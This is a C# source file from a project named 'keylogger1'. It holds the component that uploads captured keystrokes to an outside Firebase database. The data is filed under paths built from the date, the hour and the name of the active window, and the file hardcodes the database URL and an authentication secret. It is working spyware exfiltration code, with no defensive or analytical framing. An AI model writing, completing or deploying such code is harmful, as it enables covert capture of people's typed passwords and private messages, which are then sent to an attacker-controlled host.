using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using FireSharp.Config;
using FireSharp.Response;
using FireSharp.Interfaces;
using System.Net;
using keylogger1;

namespace keylogger1
{
    internal class FireBaseWrite
    {
        string getpath()
        {
            string path = "ComputerName/Year/Month/Day/Hour/";
            string hostName = Dns.GetHostName();
            string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();
            string year = DateTime.Now.ToString("yyyy");
            string month = DateTime.Now.ToString("MM");
            string day = DateTime.Now.ToString("dd");
            string hour = DateTime.Now.ToString("HH");
            //string sec = DateTime.Now.ToString("ss");

            
            long sec = DateTimeOffset.Now.ToUnixTimeSeconds();


            WindowName wn = new WindowName();
            string app = wn.NN();

            path = $"{"t"}/{year}y/{month}m/{day}d/{hour}h/{app}/{sec}s/";

            //return path;
            return path;
        }
        public int writeto(string keystring)
        {
            IFirebaseConfig fcon = new FirebaseConfig()
            {
                AuthSecret = "FRheDrVWKwQsiUmygrfHLhCy9iXwIlC38w6ElmLq",
                BasePath = "https://test-d0de8-default-rtdb.firebaseio.com/"
            };
            IFirebaseClient client;
            client = new FireSharp.FirebaseClient(fcon);

            string path = this.getpath(); 

            try
            {
                string std = (client.Get(path)).ResultAs<string>();
                if (std == null)
                {
                    client.Set(path, keystring);
                }
                else
                {
                    std += keystring;
                    client.Set(path, std);
                }
            } catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }



  

            return 1;
        }
    }
}
